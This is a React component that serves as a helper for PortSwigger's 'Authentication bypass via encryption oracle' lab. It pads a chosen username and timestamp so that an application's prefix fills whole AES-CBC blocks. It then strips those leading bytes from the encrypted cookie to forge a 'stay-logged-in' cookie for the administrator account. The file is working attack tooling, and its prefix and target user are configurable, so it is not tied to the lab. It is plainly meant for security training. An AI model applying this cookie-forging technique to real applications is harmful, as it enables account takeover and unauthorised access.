import { useMemo, useState } from 'react';

/*
 * Helper for encryption-oracle auth bypass (e.g. PortSwigger's
 * "Authentication bypass via encryption oracle").
 *
 * The app encrypts `<prefix><your input>` and hands the ciphertext back (the
 * encryption oracle). For the PortSwigger lab the prefix is
 * `Invalid email address: ` and the forged target is `username:timestamp`, but
 * the prefix is app-specific — change it and the pad length / byte-delete count
 * recompute. To forge a cookie that decrypts to <target>:
 *   1. Pad your input so the prefix fills a whole number of cipher blocks:
 *      pad = (⌈prefix/block⌉·block) − prefix. Your real <target> then starts
 *      cleanly on a block boundary.
 *   2. Encrypt that, then delete the leading (prefix + pad) bytes of the raw
 *      ciphertext — the decrypted remainder is exactly <target>, no prefix.
 *
 * Runs entirely in the browser — nothing is sent anywhere. All values are
 * local component state only.
 *
 * Host seams (props): openModal({code,label}) shows the "view" popup (button
 * hidden when absent); onBurst() fires on a successful copy.
 */

const BLOCK = 16; // AES-CBC block size
const DEFAULT_PREFIX = 'Invalid email address: '; // the PortSwigger lab's wrapper

/* URL-decode → base64-decode to raw bytes → drop first n bytes →
   base64-encode → URL-encode (the shape the cookie wants). */
function deleteLeadingBytes(cookieVal, n) {
  try {
    const b64 = decodeURIComponent(cookieVal.trim());
    const bin = atob(b64); // Latin-1 binary string = raw ciphertext bytes
    if (bin.length <= n) return { out: '', err: `only ${bin.length} bytes — can't delete ${n}` };
    if (bin.length % BLOCK !== 0) {
      return { out: '', err: `${bin.length} bytes isn't a multiple of ${BLOCK} — check alignment` };
    }
    return { out: encodeURIComponent(btoa(bin.slice(n))), err: '' };
  } catch {
    return { out: '', err: 'not valid URL-encoded Base64' };
  }
}

export default function EncryptionOracleTool({ openModal, onBurst = () => {} }) {
  const [prefix, setPrefix] = useState(DEFAULT_PREFIX);
  const [user, setUser] = useState('administrator');
  const [ts, setTs] = useState('');
  const [cookie, setCookie] = useState('');
  const [copied, setCopied] = useState('');

  // Delete count = prefix rounded up to a whole block; pad fills the remainder.
  const { deleteBytes, pad } = useMemo(() => {
    const d = Math.ceil(prefix.length / BLOCK) * BLOCK;
    return { deleteBytes: d, pad: 'x'.repeat(d - prefix.length) };
  }, [prefix]);

  const email = useMemo(() => `${pad}${user || ''}:${ts || ''}`, [pad, user, ts]);

  const forged = useMemo(() => {
    if (!cookie.trim()) return { out: '—', err: '' };
    const { out, err } = deleteLeadingBytes(cookie, deleteBytes);
    return { out: out || '—', err };
  }, [cookie, deleteBytes]);

  function copy(key, value) {
    if (!value || value === '—') return;
    const done = () => {
      setCopied(key);
      onBurst();
      setTimeout(() => setCopied(''), 1400);
    };
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(value).then(done, done);
    } else {
      done();
    }
  }

  return (
    <div className="tool">
      <div className="tool-row">
        <label className="tool-wide">
          app prefix (what gets prepended before encryption)
          <input
            type="text"
            value={prefix}
            placeholder="e.g. Invalid email address: "
            autoComplete="off"
            spellCheck={false}
            onChange={(e) => setPrefix(e.target.value)}
          />
        </label>
      </div>
      <div className="tool-row">
        <label>
          target username
          <input
            type="text"
            value={user}
            autoComplete="off"
            spellCheck={false}
            onChange={(e) => setUser(e.target.value)}
          />
        </label>
        <label>
          your timestamp
          <input
            type="text"
            value={ts}
            placeholder="e.g. 1598530205184"
            autoComplete="off"
            spellCheck={false}
            onChange={(e) => setTs(e.target.value)}
          />
        </label>
      </div>

      <div className="tool-out">
        <div className="tool-line">
          <span className="k">email to encrypt</span>
          <code>{email}</code>
          {openModal && (
            <button type="button" className="mini-copy" onClick={() => openModal({ code: email, label: 'email to encrypt' })}>view</button>
          )}
          <button
            type="button"
            className={'mini-copy' + (copied === 'email' ? ' copied' : '')}
            onClick={() => copy('email', email)}
          >
            {copied === 'email' ? 'copied ✓' : 'copy'}
          </button>
        </div>
      </div>
      <p className="hint">
        Paste that into the input field the oracle encrypts (the lab's <code className="inline">email</code> field).
        The app stores <code className="inline">{prefix}{pad}{user || 'administrator'}:{ts || 'TS'}</code> encrypted
        in the oracle cookie — the {prefix.length}-byte prefix plus the {pad.length} <code className="inline">x</code> pad
        fill exactly {deleteBytes} bytes ({deleteBytes / BLOCK} block{deleteBytes / BLOCK === 1 ? '' : 's'}).
        {pad.length === 0 && ' (Prefix is already block-aligned — no pad needed.)'}
      </p>

      <div className="tool-row">
        <label className="tool-wide">
          notification cookie (from Set-Cookie)
          <input
            type="text"
            value={cookie}
            placeholder="paste the URL-encoded Base64 notification value…"
            autoComplete="off"
            spellCheck={false}
            onChange={(e) => setCookie(e.target.value)}
          />
        </label>
      </div>
      <div className="tool-out">
        <div className="tool-line">
          <span className="k">forged stay-logged-in</span>
          <code>{forged.out}</code>
          {openModal && (
            <button type="button" className="mini-copy" onClick={() => openModal({ code: forged.out, label: 'forged stay-logged-in' })}>view</button>
          )}
          <button
            type="button"
            className={'mini-copy' + (copied === 'forged' ? ' copied' : '')}
            onClick={() => copy('forged', forged.out)}
          >
            {copied === 'forged' ? 'copied ✓' : 'copy'}
          </button>
        </div>
        {forged.err && <p className="hint" style={{ color: 'var(--bad, #e66)' }}>⚠ {forged.err}</p>}
      </div>
      <p className="hint">
        Deletes the first {deleteBytes} bytes of the raw ciphertext (URL-decode → Base64-decode → drop {deleteBytes} bytes → re-encode),
        exactly what you'd do by hand in Burp Decoder. Drop the result into the <code className="inline">stay-logged-in</code> cookie
        (delete the <code className="inline">session</code> cookie) to log in as <code className="inline">{user || 'administrator'}</code>.
        Runs entirely in your browser — nothing is sent anywhere.
      </p>
    </div>
  );
}
